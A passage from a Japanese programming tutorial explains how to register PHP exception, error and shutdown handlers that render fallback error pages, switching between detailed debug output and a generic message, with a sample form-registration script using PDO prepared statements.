<span id="定数-display_private_error-の定義" class="fragment"></span><a href="#%E5%AE%9A%E6%95%B0-display_private_error-%E3%81%AE%E5%AE%9A%E7%BE%A9"><i class="fa fa-link"></i></a><strong>定数 <code>DISPLAY_PRIVATE_ERROR</code> の定義</strong>
</h3>

<p>これが <code>True</code> として評価可能な値で定義されているとき、開発者向けの詳細な情報を出力します。それ以外の場合は、利用者向けの代替内容が表示されます。デバッグ時は <code>True</code> 、リリース時は <code>False</code> として定義しておいてください。</p>

<h3>
<span id="定数-site_name-の定義" class="fragment"></span><a href="#%E5%AE%9A%E6%95%B0-site_name-%E3%81%AE%E5%AE%9A%E7%BE%A9"><i class="fa fa-link"></i></a><strong>定数 <code>SITE_NAME</code> の定義</strong>
</h3>

<p>表示したいサイト名を設定します。未定義の場合は <code>サイト名未設定</code> となります。</p>

<h2>
<span id="例外ハンドラの登録" class="fragment"></span><a href="#%E4%BE%8B%E5%A4%96%E3%83%8F%E3%83%B3%E3%83%89%E3%83%A9%E3%81%AE%E7%99%BB%E9%8C%B2"><i class="fa fa-link"></i></a><strong>例外ハンドラの登録</strong>
</h2>

<p>クロージャを使ってグローバル空間を汚さないように登録します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">set_exception_handler</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// ヘッダー送信済みの場合は無視する</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">headers_sent</span><span class="p">())</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// バッファをすべてクリア</span>
    <span class="k">while</span> <span class="p">(</span><span class="nb">ob_get_level</span><span class="p">())</span> <span class="p">{</span>
        <span class="nb">ob_end_clean</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="c1">// 送信予定のヘッダーをすべて削除</span>
    <span class="nb">header_remove</span><span class="p">();</span>
    <span class="c1">// 定数を取得</span>
    <span class="nv">$site</span> <span class="o">=</span> <span class="nb">defined</span><span class="p">(</span><span class="s1">'SITE_NAME'</span><span class="p">)</span> <span class="o">?</span> <span class="nx">SITE_NAME</span> <span class="o">:</span> <span class="s1">'サイト名未設定'</span><span class="p">;</span>
    <span class="nv">$display</span> <span class="o">=</span> <span class="nb">defined</span><span class="p">(</span><span class="s1">'DISPLAY_PRIVATE_ERROR'</span><span class="p">)</span> <span class="o">?</span> <span class="nx">DISPLAY_PRIVATE_ERROR</span> <span class="o">:</span> <span class="k">false</span><span class="p">;</span>
    <span class="c1">// HTML特殊文字をエスケープして文字コードを統一するクロージャの用意</span>
    <span class="nv">$h</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$str</span> <span class="o">=</span> <span class="nb">mb_convert_encoding</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">,</span> <span class="s1">'ASCII,JIS,UTF-8,CP51932,SJIS-win'</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
    <span class="p">};</span>
    <span class="c1">// 表示内容を設定</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$display</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 本番稼動時にメッセージを表示すべきかどうかを判定するクロージャの用意</span>
        <span class="nv">$displayable</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// LogicExceptionとErrorExceptionは無視</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span> <span class="nx">instanceof</span> <span class="nx">LogicException</span> <span class="k">or</span> <span class="nv">$e</span> <span class="nx">instanceof</span> <span class="nx">ErrorException</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="c1">// グローバルスコープにて自前で生成した例外は扱う</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$frame</span> <span class="o">=</span> <span class="nb">current</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getTrace</span><span class="p">()))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="c1">// PHPコアやエクステンションによって生成されたものは無視</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$frame</span><span class="p">[</span><span class="s1">'class'</span><span class="p">]))</span> <span class="p">{</span>
                    <span class="nv">$reflection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$frame</span><span class="p">[</span><span class="s1">'class'</span><span class="p">]);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nv">$reflection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionFunction</span><span class="p">(</span><span class="nv">$frame</span><span class="p">[</span><span class="s1">'function'</span><span class="p">]);</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="o">!</span><span class="nv">$reflection</span><span class="o">-&gt;</span><span class="na">isInternal</span><span class="p">();</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">ReflectionException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// クロージャは扱う</span>
                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">};</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="c1">// 表示すべきでないものはスキップ</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$displayable</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$error</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'    &lt;li&gt;'</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">())</span> <span class="o">.</span> <span class="s1">'&lt;/li&gt;'</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$e</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getPrevious</span><span class="p">());</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$error</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$error</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'  &lt;h1&gt;内部サーバーエラー&lt;/h1&gt;'</span><span class="p">,</span>
                <span class="s1">'  &lt;p&gt;大変ご不便をおかけしております。申し訳ございません。&lt;/p&gt;'</span><span class="p">,</span>
            <span class="p">));</span>
            <span class="c1">// 500 Internal Server Error を返す</span>
            <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/html; charset=utf-8'</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$error</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'  &lt;h1&gt;エラーが発生しました&lt;/h1&gt;'</span><span class="p">,</span>
                <span class="s1">'  &lt;ul&gt;'</span><span class="p">,</span>
                <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$error</span><span class="p">)),</span>
                <span class="s1">'  &lt;/ul&gt;'</span><span class="p">,</span>
            <span class="p">));</span>
            <span class="c1">// 400 Bad Request を返す</span>
            <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/html; charset=utf-8'</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="mi">400</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="nv">$error</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'  &lt;dl&gt;'</span><span class="p">,</span>
                <span class="s1">'    &lt;dt&gt;メッセージ&lt;/dt&gt;'</span><span class="p">,</span>
                <span class="s1">'    &lt;dd&gt;'</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">())</span> <span class="o">.</span> <span class="s1">'&lt;/dd&gt;'</span><span class="p">,</span>
                <span class="s1">'    &lt;dt&gt;ファイル&lt;dt&gt;'</span><span class="p">,</span>
                <span class="s1">'    &lt;dd&gt;'</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getFile</span><span class="p">())</span> <span class="o">.</span> <span class="s1">'&lt;/dd&gt;'</span><span class="p">,</span>
                <span class="s1">'    &lt;dt&gt;行&lt;/dt&gt;'</span><span class="p">,</span>
                <span class="s1">'    &lt;dd&gt;'</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getLine</span><span class="p">())</span> <span class="o">.</span> <span class="s1">'&lt;/dd&gt;'</span><span class="p">,</span>
                <span class="s1">'  &lt;/dl&gt;'</span><span class="p">,</span>
            <span class="p">));</span>
        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$e</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getPrevious</span><span class="p">());</span>
        <span class="nv">$error</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">'  &lt;h1&gt;例外発生&lt;/h1&gt;'</span><span class="p">,</span>
            <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$error</span><span class="p">)),</span>
        <span class="p">));</span>
        <span class="c1">// 500 Internal Server Error を返す</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/html; charset=utf-8'</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// エラーページをレンダリング</span>
    <span class="k">echo</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'&lt;!DOCTYPE html&gt;'</span><span class="p">,</span>
        <span class="s1">'&lt;html&gt;'</span><span class="p">,</span>
        <span class="s1">'&lt;head&gt;'</span><span class="p">,</span>
        <span class="s1">'  &lt;title&gt;'</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">(</span><span class="nv">$site</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'&lt;/title&gt;'</span><span class="p">,</span>
        <span class="s1">'&lt;/head&gt;'</span><span class="p">,</span>
        <span class="s1">'&lt;body&gt;'</span><span class="p">,</span>
        <span class="nv">$error</span><span class="p">,</span>
        <span class="s1">'&lt;/body&gt;'</span><span class="p">,</span>
        <span class="s1">'&lt;/html&gt;'</span><span class="p">,</span>
    <span class="p">));</span>
<span class="p">});</span>
</pre></div></div>

<h1>
<span id="応用" class="fragment"></span><a href="#%E5%BF%9C%E7%94%A8"><i class="fa fa-link"></i></a><strong>応用</strong>
</h1>

<h2>
<span id="エラーハンドラの登録" class="fragment"></span><a href="#%E3%82%A8%E3%83%A9%E3%83%BC%E3%83%8F%E3%83%B3%E3%83%89%E3%83%A9%E3%81%AE%E7%99%BB%E9%8C%B2"><i class="fa fa-link"></i></a><strong>エラーハンドラの登録</strong>
</h2>

<p>エラーを例外に変換してスローさせることが目的です。クロージャを使ってグローバル空間を汚さないように登録します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">set_error_handler</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$no</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// エラー抑制演算子「@」が無い場合のみ実行</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">error_reporting</span><span class="p">())</span> <span class="p">{</span>
        <span class="c1">// ErrorExceptionに変換</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">ErrorException</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$no</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">});</span>
</pre></div></div>

<p>第2引数を省略した場合、全てのエラーを表す <strong><code>E_ALL | E_STRICT</code></strong> が対象となります。</p>

<h2>
<span id="シャットダウン関数の登録" class="fragment"></span><a href="#%E3%82%B7%E3%83%A3%E3%83%83%E3%83%88%E3%83%80%E3%82%A6%E3%83%B3%E9%96%A2%E6%95%B0%E3%81%AE%E7%99%BB%E9%8C%B2"><i class="fa fa-link"></i></a><strong>シャットダウン関数の登録</strong>
</h2>

<p>通常のエラーハンドラだけでは <strong>Parse Error</strong> や Catchableでない <strong>Fatal Error</strong> に対応することが出来ません。そこでシャットダウン関数を活用して、これにも対応させてみることにします。クロージャを使ってグローバル空間を汚さないように登録します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">register_shutdown_function</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="c1">// 致命的なエラーを表示する必要が無い、もしくはヘッダー送信済みの場合は無視する</span>
    <span class="nv">$flags</span> <span class="o">=</span> <span class="k">E_PARSE</span> <span class="o">|</span> <span class="k">E_ERROR</span> <span class="o">|</span> <span class="nx">E_USER_ERROR</span> <span class="o">|</span> <span class="nx">E_CORE_ERROR</span> <span class="o">|</span> <span class="nx">E_COMPILE_ERROR</span><span class="p">;</span>
    <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="o">!</span><span class="nv">$e</span> <span class="o">=</span> <span class="nb">error_get_last</span><span class="p">()</span><span class="o">:</span>
        <span class="k">case</span> <span class="o">!</span><span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="s1">'type'</span><span class="p">]</span> <span class="o">&amp;</span> <span class="nv">$flags</span><span class="p">)</span><span class="o">:</span>
        <span class="k">case</span> <span class="o">!</span><span class="p">(</span><span class="nb">error_reporting</span><span class="p">()</span> <span class="o">&amp;</span> <span class="nv">$flags</span><span class="p">)</span><span class="o">:</span>
        <span class="k">case</span> <span class="nb">headers_sent</span><span class="p">()</span><span class="o">:</span>
            <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// バッファをすべてクリア</span>
    <span class="k">while</span> <span class="p">(</span><span class="nb">ob_get_level</span><span class="p">())</span> <span class="p">{</span>
        <span class="nb">ob_end_clean</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="c1">// 送信予定のヘッダーをすべて削除</span>
    <span class="nb">header_remove</span><span class="p">();</span>
    <span class="c1">// 定数を取得</span>
    <span class="nv">$site</span> <span class="o">=</span> <span class="nb">defined</span><span class="p">(</span><span class="s1">'SITE_NAME'</span><span class="p">)</span> <span class="o">?</span> <span class="nx">SITE_NAME</span> <span class="o">:</span> <span class="s1">'サイト名未設定'</span><span class="p">;</span>
    <span class="nv">$display</span> <span class="o">=</span> <span class="nb">defined</span><span class="p">(</span><span class="s1">'DISPLAY_PRIVATE_ERROR'</span><span class="p">)</span> <span class="o">?</span> <span class="nx">DISPLAY_PRIVATE_ERROR</span> <span class="o">:</span> <span class="k">false</span><span class="p">;</span>
    <span class="c1">// HTML特殊文字をエスケープして文字コードを統一するクロージャの用意</span>
    <span class="nv">$h</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$str</span> <span class="o">=</span> <span class="nb">mb_convert_encoding</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">,</span> <span class="s1">'ASCII,JIS,UTF-8,CP51932,SJIS-win'</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
    <span class="p">};</span>
    <span class="c1">// 表示内容を設定</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$display</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$error</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">'  &lt;h1&gt;内部サーバーエラー&lt;/h1&gt;'</span><span class="p">,</span>
            <span class="s1">'  &lt;p&gt;大変ご不便をおかけしております。申し訳ございません。&lt;/p&gt;'</span><span class="p">,</span>
        <span class="p">));</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$error</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">'  &lt;h1&gt;致命的なエラー&lt;/h1&gt;'</span><span class="p">,</span>
            <span class="s1">'  &lt;dl&gt;'</span><span class="p">,</span>
            <span class="s1">'    &lt;dt&gt;メッセージ&lt;/dt&gt;'</span><span class="p">,</span>
            <span class="s1">'    &lt;dd&gt;'</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="s1">'message'</span><span class="p">])</span> <span class="o">.</span> <span class="s1">'&lt;/dd&gt;'</span><span class="p">,</span>
            <span class="s1">'    &lt;dt&gt;ファイル&lt;dt&gt;'</span><span class="p">,</span>
            <span class="s1">'    &lt;dd&gt;'</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])</span> <span class="o">.</span> <span class="s1">'&lt;/dd&gt;'</span><span class="p">,</span>
            <span class="s1">'    &lt;dt&gt;行&lt;/dt&gt;'</span><span class="p">,</span>
            <span class="s1">'    &lt;dd&gt;'</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="s1">'line'</span><span class="p">])</span> <span class="o">.</span> <span class="s1">'&lt;/dd&gt;'</span><span class="p">,</span>
            <span class="s1">'  &lt;/dl&gt;'</span><span class="p">,</span>
        <span class="p">));</span>
    <span class="p">}</span>
    <span class="c1">// 500 Internal Server Error を返す</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/html; charset=utf-8'</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
    <span class="c1">// エラーページをレンダリング</span>
    <span class="k">echo</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'&lt;!DOCTYPE html&gt;'</span><span class="p">,</span>
        <span class="s1">'&lt;html&gt;'</span><span class="p">,</span>
        <span class="s1">'&lt;head&gt;'</span><span class="p">,</span>
        <span class="s1">'  &lt;title&gt;'</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">(</span><span class="nv">$site</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'&lt;/title&gt;'</span><span class="p">,</span>
        <span class="s1">'&lt;/head&gt;'</span><span class="p">,</span>
        <span class="s1">'&lt;body&gt;'</span><span class="p">,</span>
        <span class="nv">$error</span><span class="p">,</span>
        <span class="s1">'&lt;/body&gt;'</span><span class="p">,</span>
        <span class="s1">'&lt;/html&gt;'</span><span class="p">,</span>
    <span class="p">));</span>
<span class="p">});</span>
</pre></div></div>

<h1>
<span id="実運用を踏まえての工夫" class="fragment"></span><a href="#%E5%AE%9F%E9%81%8B%E7%94%A8%E3%82%92%E8%B8%8F%E3%81%BE%E3%81%88%E3%81%A6%E3%81%AE%E5%B7%A5%E5%A4%AB"><i class="fa fa-link"></i></a><strong>実運用を踏まえての工夫</strong>
</h1>

<p>今回は依存性を一切排除するという強いポリシーのもと <strong>HTMLをPHPコード中にべた書きする</strong> という思い切った行動に出ましたが、実用性を考えていくとこのままでは支障があるので、以下のようにしてもいいでしょう。</p>

<ul>
<li>「デバッグ時向け」「リリース時向け」のエラーテンプレートの絶対パスをそれぞれ定数として定義しておく。</li>
<li>定数が定義されているとき、<ins>Try-Catchブロックを設けて</ins>エラーテンプレートのレンダリングを試みる。</li>
<li>定数が定義されていない場合やエラーテンプレートのレンダリングで例外が発生した場合は、最初から発生していた例外に対してデフォルトのレンダリングを行う。必要に応じて、エラーテンプレートのレンダリング中に発生した例外も対象とする。</li>
</ul>

<p><strong>何があっても</strong> 表示できるようにするためには、依存性を一切排除した部分を持たせるのはやむを得ないというのが私の考えです。</p>

<h1>
<span id="活躍シーン" class="fragment"></span><a href="#%E6%B4%BB%E8%BA%8D%E3%82%B7%E3%83%BC%E3%83%B3"><i class="fa fa-link"></i></a><strong>活躍シーン</strong>
</h1>

<p>内容が長くなるのでこれを一番最後に持ってきました。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">init.php</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">register_shutdown_function</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="cm">/* 省略 */</span>
<span class="p">});</span>
<span class="nb">set_exception_handler</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* 省略 */</span>
<span class="p">});</span>
<span class="nb">set_error_handler</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$no</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* 省略 */</span>
<span class="p">});</span>
<span class="nb">ob_start</span><span class="p">();</span>
<span class="k">const</span> <span class="no">DISPLAY_PRIVATE_ERROR</span> <span class="o">=</span> <span class="k">true</span> <span class="k">or</span> <span class="k">false</span><span class="p">;</span> 
</pre></div>
</div>

<p>なんと、こんな手抜きコーディングが許されるようになります。ちょっとは生産性向上に期待できる（？）</p>

<div class="code-frame" data-lang="html+php">
<div class="code-lang"><span class="bold">register.php</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'init.php'</span><span class="p">;</span>
<span class="k">const</span> <span class="no">SITE_NAME</span> <span class="o">=</span> <span class="s1">'My Site'</span><span class="p">;</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>
<span class="nv">$e</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$e</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">'名前が入力されていません'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">ctype_digit</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'age'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$e</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">'年齢は数字で入力してください'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">'mysql:host=dbserver;dbname=test;charset=utf8'</span><span class="p">,</span> <span class="s1">'root'</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">);</span>
<span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">);</span>
<span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_EMULATE_PREPARES</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'INSERT INTO people(name, age) VALUES(:name, :age)'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/html; charset=utf-8'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nx">SITE_NAME</span><span class="p">)</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>以下の内容で登録しました。<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">dl</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>名前<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;&lt;</span><span class="nt">dd</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>年齢<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;&lt;</span><span class="nt">dd</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'age'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">正しく登録できたとき</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>My Site<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
